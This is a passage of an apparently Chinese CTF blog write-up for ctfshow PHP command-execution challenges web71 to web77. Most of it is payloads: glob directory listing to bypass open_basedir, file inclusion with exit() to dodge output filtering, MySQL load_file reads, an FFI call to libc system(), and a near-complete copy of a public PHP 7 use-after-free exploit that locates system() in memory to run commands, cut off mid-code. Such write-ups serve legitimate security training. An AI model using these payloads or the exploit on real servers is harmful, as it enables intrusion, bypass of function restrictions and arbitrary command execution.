href="#web71" class="headerlink" title="web71"></a>web71</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041737941.png" alt="Code_QPS6Ju4ej7"></p><p>下载index.php</p><p>阅读源码</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ob_get_contents — 返回输出缓冲区的内容</span><br><span class="line">ob_end_clean — 清空（擦除）缓冲区并关闭输出缓冲</span><br><span class="line"></span><br><span class="line">此函数丢弃最顶层输出缓冲区的内容并关闭这个缓冲区。如果想要进一步处理缓冲区的内容，必须在ob_end_clean()之前调用ob_get_contents()，因为当调用ob_end_clean()时缓冲区内容将被丢弃</span><br></pre></td></tr></table></figure><p>正则用?替换了数字和字母</p><p>通过exit();使程序提前退出，绕过后面的正则表达式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=include(&quot;/flag.txt&quot;);exit(0);</span><br></pre></td></tr></table></figure><h2 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h2><p>源码同上一题</p><p>hint</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>POST传入再通过抓包修改发送hint发现flag在flag0.txt,之后利用uaf的脚本（<a href="https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass%EF%BC%89%E8%BF%9B%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass）进行命令执行</a><br>这里的<code>?&gt;</code>是为了闭合前面<code>&lt;?php</code></p><h2 id="web73"><a href="#web73" class="headerlink" title="web73"></a>web73</h2><p>同上</p><p>先查目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>); <span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>) &#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27; &#x27;</span>); &#125;<span class="keyword">exit</span>(<span class="number">0</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现有个flagc.txt文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: c=include(&quot;/flagc.txt&quot;);exit();</span><br></pre></td></tr></table></figure><h2 id="web74"><a href="#web74" class="headerlink" title="web74"></a>web74</h2><p>先查目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>); <span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>) &#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27; &#x27;</span>); &#125;<span class="keyword">exit</span>(<span class="number">0</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现有个flagx.txt文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: c=include(&quot;/flagx.txt&quot;);exit();</span><br></pre></td></tr></table></figure><h2 id="web75"><a href="#web75" class="headerlink" title="web75"></a>web75</h2><p>先查目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27; &#x27;</span>);&#125;<span class="keyword">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>发现flag36.txt</p><p>利用<code>mysql load_file</code>读文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">try</span> &#123;<span class="variable">$dbh</span> = <span class="keyword">new</span> PDO(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;root&#x27;</span>);<span class="keyword">foreach</span>(<span class="variable">$dbh</span>-&gt;query(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>; &#125;<span class="variable">$dbh</span> = <span class="literal">null</span>;&#125;<span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;<span class="keyword">echo</span> <span class="variable">$e</span>-</span><br><span class="line">&gt;getMessage();<span class="keyword">exit</span>(<span class="number">0</span>);&#125;<span class="keyword">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><h2 id="web76"><a href="#web76" class="headerlink" title="web76"></a>web76</h2><p>先查目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27; &#x27;</span>);&#125;<span class="keyword">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>发现flag36d.txt</p><p>利用<code>mysql load_file</code>读文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">try</span> &#123;<span class="variable">$dbh</span> = <span class="keyword">new</span> PDO(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;root&#x27;</span>);<span class="keyword">foreach</span>(<span class="variable">$dbh</span>-&gt;query(<span class="string">&#x27;select load_file(&quot;/flag36d.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>; &#125;<span class="variable">$dbh</span> = <span class="literal">null</span>;&#125;<span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;<span class="keyword">echo</span> <span class="variable">$e</span>-</span><br><span class="line">&gt;getMessage();<span class="keyword">exit</span>(<span class="number">0</span>);&#125;<span class="keyword">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><h2 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h2><p>先查目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27; &#x27;</span>);&#125;<span class="keyword">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>发现flag36x.txt</p><p>发现有一个<code>readflag</code>肯定是要调用这个,看了这个FFI拓展,不太懂</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$ffi</span>=FFI::cdef(<span class="string">&quot;int system(char *command);&quot;</span>, <span class="string">&quot;libc.so.6&quot;</span>);<span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; 1.txt&#x27;</span>;<span class="variable">$ffi</span>-&gt;system(<span class="variable">$a</span>);<span class="keyword">exit</span>(); </span><br></pre></td></tr></table></figure><p>访问 1.txt即可</p><h4 id="补充-羽师傅的总结"><a href="#补充-羽师傅的总结" class="headerlink" title="补充 羽师傅的总结"></a>补充 羽师傅的总结</h4><p>​                                                                                                                <strong>–摘取自<a href="https://blog.csdn.net/miuzzx/article/details/108619930">https://blog.csdn.net/miuzzx/article/details/108619930</a></strong></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">flag不在flag.php中,需要先查找flag所在的位置</span><br><span class="line">scandir()</span><br><span class="line">opendir()</span><br><span class="line">用法</span><br><span class="line">c=var_dump(scandir(<span class="string">&quot;/&quot;</span>));highlight_file(<span class="string">&quot;/flag.txt&quot;</span>);                                                       </span><br><span class="line">c=<span class="variable">$a</span>=opendir(<span class="string">&quot;/&quot;</span>); <span class="keyword">while</span> ((<span class="variable">$file</span> = readdir(<span class="variable">$a</span>)) !== <span class="literal">false</span>)&#123;<span class="built_in">echo</span> <span class="variable">$file</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>; &#125;;highlight_file(<span class="string">&quot;/flag.txt&quot;</span>); </span><br><span class="line">后面因为是txt文件，所以直接用include直接包含就能显示flag include() require() </span><br><span class="line">用法： </span><br><span class="line">include(<span class="string">&quot;/flag.txt&quot;</span>);   </span><br><span class="line">require(<span class="string">&quot;/flag.txt&quot;</span>);  </span><br><span class="line"></span><br><span class="line">绕过<span class="built_in">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">直接后面输入 <span class="built_in">exit</span>();即可</span><br><span class="line">用法</span><br><span class="line">include(<span class="string">&quot;/flag.txt&quot;</span>);<span class="built_in">exit</span>(); </span><br><span class="line">require(<span class="string">&quot;/flag.txt&quot;</span>);<span class="built_in">exit</span>();  </span><br><span class="line"><span class="built_in">echo</span>(scandir(<span class="string">&quot;/&quot;</span>)[6]);include(<span class="string">&quot;/flagc.txt&quot;</span>);<span class="built_in">exit</span>();  </span><br><span class="line"><span class="variable">$a</span>=opendir(<span class="string">&quot;/&quot;</span>); <span class="keyword">while</span> ((<span class="variable">$file</span> = readdir(<span class="variable">$a</span>)) !== <span class="literal">false</span>)&#123;<span class="built_in">echo</span> <span class="variable">$file</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>; &#125;;include(<span class="string">&quot;flagx.txt&quot;</span>);<span class="built_in">exit</span>(); </span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line">绕过open_basedir</span><br><span class="line">//可绕过web72目录限制,但无法读文件</span><br><span class="line"><span class="variable">$a</span>=opendir(<span class="string">&quot;glob:///*&quot;</span>); <span class="keyword">while</span> ((<span class="variable">$file</span> = readdir(<span class="variable">$a</span>)) !== <span class="literal">false</span>)&#123;<span class="built_in">echo</span> <span class="variable">$file</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>; &#125;;include(<span class="string">&quot;flagx.txt&quot;</span>);<span class="built_in">exit</span>(); </span><br><span class="line"></span><br><span class="line">//可绕web72，利用uaf绕过函数限制 (传入后需url编码下)</span><br><span class="line">代码来源(https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass)</span><br><span class="line">c=?&gt;&lt;?php</span><br><span class="line">pwn(<span class="string">&quot;ls /;cat /flag0.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> pwn(<span class="variable">$cmd</span>) &#123;</span><br><span class="line">    global <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line">    class Vuln &#123;</span><br><span class="line">        public <span class="variable">$a</span>;</span><br><span class="line">        public <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>() &#123; </span><br><span class="line">            global <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="built_in">unset</span>(<span class="variable">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (new Exception)-&gt;getTrace(); <span class="comment"># ;)</span></span><br><span class="line">            <span class="keyword">if</span>(!isset(<span class="variable">$backtrace</span>[1][<span class="string">&#x27;args&#x27;</span>])) &#123; <span class="comment"># PHP &gt;= 7.4</span></span><br><span class="line">                <span class="variable">$backtrace</span> = debug_backtrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">class Helper &#123;</span><br><span class="line">    public <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> str2ptr(&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = 0, <span class="variable">$s</span> = 8) &#123;</span><br><span class="line">    <span class="variable">$address</span> = 0;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-1; <span class="variable">$j</span> &gt;= 0; <span class="variable">$j</span>--) &#123;</span><br><span class="line">        <span class="variable">$address</span> &lt;&lt;= 8;</span><br><span class="line">        <span class="variable">$address</span> |= ord(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$address</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> ptr2str(<span class="variable">$ptr</span>, <span class="variable">$m</span> = 8) &#123;</span><br><span class="line">    <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=0; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$out</span> .= sprintf(<span class="string">&#x27;%c&#x27;</span>,<span class="variable">$ptr</span> &amp; 0xff);</span><br><span class="line">        <span class="variable">$ptr</span> &gt;&gt;= 8;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$out</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> write(&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = 8) &#123;</span><br><span class="line">    <span class="variable">$i</span> = 0;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = sprintf(<span class="string">&#x27;%c&#x27;</span>,<span class="variable">$v</span> &amp; 0xff);</span><br><span class="line">        <span class="variable">$v</span> &gt;&gt;= 8;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> leak(<span class="variable">$addr</span>, <span class="variable">$p</span> = 0, <span class="variable">$s</span> = 8) &#123;</span><br><span class="line">    global <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">    write(<span class="variable">$abc</span>, 0x68, <span class="variable">$addr</span> + <span class="variable">$p</span> - 0x10);</span><br><span class="line">    <span class="variable">$leak</span> = strlen(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$s</span> != 8) &#123; <span class="variable">$leak</span> %= 2 &lt;&lt; (<span class="variable">$s</span> * 8) - 1; &#125;</span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$leak</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> parse_elf(<span class="variable">$base</span>) &#123;</span><br><span class="line">    <span class="variable">$e_type</span> = leak(<span class="variable">$base</span>, 0x10, 2);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$e_phoff</span> = leak(<span class="variable">$base</span>, 0x20);</span><br><span class="line">    <span class="variable">$e_phentsize</span> = leak(<span class="variable">$base</span>, 0x36, 2);</span><br><span class="line">    <span class="variable">$e_phnum</span> = leak(<span class="variable">$base</span>, 0x38, 2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">        <span class="variable">$p_type</span>  = leak(<span class="variable">$header</span>, 0, 4);</span><br><span class="line">        <span class="variable">$p_flags</span> = leak(<span class="variable">$header</span>, 4, 4);</span><br><span class="line">        <span class="variable">$p_vaddr</span> = leak(<span class="variable">$header</span>, 0x10);</span><br><span class="line">        <span class="variable">$p_memsz</span> = leak(<span class="variable">$header</span>, 0x28);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$p_type</span> == 1 &amp;&amp; <span class="variable">$p_flags</span> == 6) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">            <span class="comment"># handle pie</span></span><br><span class="line">            <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == 2 ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">            <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == 1 &amp;&amp; <span class="variable">$p_flags</span> == 5) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">            <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">        <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> get_basic_funcs(<span class="variable">$base</span>, <span class="variable">$elf</span>) &#123;</span><br><span class="line">    list(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / 8; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$leak</span> = leak(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * 8);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; 0 &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">            <span class="variable">$deref</span> = leak(<span class="variable">$leak</span>);</span><br><span class="line">            <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$deref</span> != 0x746e6174736e6f63)</span><br><span class="line">                <span class="built_in">continue</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="built_in">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$leak</span> = leak(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + 4) * 8);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; 0 &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">            <span class="variable">$deref</span> = leak(<span class="variable">$leak</span>);</span><br><span class="line">            <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$deref</span> != 0x786568326e6962)</span><br><span class="line">                <span class="built_in">continue</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="built_in">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * 8;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> get_binary_base(<span class="variable">$binary_leak</span>) &#123;</span><br><span class="line">    <span class="variable">$base</span> = 0;</span><br><span class="line">    <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; 0xfffffffffffff000;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; 0x1000; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$start</span> - 0x1000 * <span class="variable">$i</span>;</span><br><span class="line">        <span class="variable">$leak</span> = leak(<span class="variable">$addr</span>, 0, 7);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$leak</span> == 0x10102464c457f) &#123; <span class="comment"># ELF header</span></span><br><span class="line">            <span class="built_in">return</span> <span class="variable">$addr</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> get_system(<span class="variable">$basic_funcs</span>) &#123;</span><br><span class="line">    <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="variable">$f_entry</span> = leak(<span class="variable">$addr</span>);</span><br><span class="line">        <span class="variable">$f_name</span> = leak(<span class="variable">$f_entry</span>, 0, 6);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$f_name</span> == 0x6d6574737973) &#123; <span class="comment"># system</span></span><br><span class="line">            <span class="built_in">return</span> leak(<span class="variable">$addr</span> + 8);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$addr</span> += 0x20;</span><br><span class="line">    &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != 0);</span><br><span class="line">    <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> trigger_uaf(<span class="variable">$arg</span>) &#123;</span><br><span class="line">    <span class="comment"># str_shuffle prevents opcache string interning</span></span><br><span class="line">    <span class="variable">$arg</span> = str_shuffle(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">    <span class="variable">$vuln</span> = new Vuln();</span><br><span class="line">    <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(stristr(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">    die(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 